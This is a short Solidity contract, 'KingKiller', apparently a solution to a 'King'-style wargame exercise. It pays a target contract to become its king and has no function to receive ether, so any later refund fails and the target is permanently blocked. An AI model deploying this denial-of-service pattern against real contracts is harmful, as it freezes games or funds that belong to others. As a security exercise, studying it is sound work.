// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingKiller {
    function iAmKing(address payable _add) public payable {
        (bool success, ) = _add.call{value: msg.value}("");
        require(success, "Failed to send value!");
    }
}
